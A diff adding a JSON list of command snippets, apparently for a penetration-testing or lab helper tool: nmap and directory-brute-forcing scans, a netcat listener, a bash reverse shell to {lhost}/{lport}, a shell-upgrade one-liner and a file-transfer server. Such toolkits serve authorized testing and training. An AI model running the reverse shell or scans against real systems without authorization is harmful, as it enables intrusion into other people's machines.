@@ -1,0 +1,11 @@
+[
+  { "name": "nmap-quick", "detail": "Most common ports", "text": "nmap -sC -sV -oN nmap-quick.txt {target}", "run": true },
+  { "name": "nmap-full", "detail": "All TCP ports", "text": "nmap -p- --min-rate 2000 -oN nmap-full.txt {target}", "run": true },
+  { "name": "gobuster", "detail": "Web directories", "text": "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt", "run": true },
+  { "name": "ffuf", "detail": "Web paths", "text": "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt", "run": true },
+  { "name": "listener", "detail": "Listener", "text": "nc -lvnp {lport}", "run": true },
+  { "name": "rev-bash", "detail": "Reverse shell template", "text": "bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'" },
+  { "name": "pty", "detail": "Upgrade the shell", "text": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" },
+  { "name": "http-server", "detail": "File transfer server", "text": "python3 -m http.server 8000", "run": true },
+  { "name": "curl-header", "detail": "Response headers", "text": "curl -sI http://{target}" }
+]
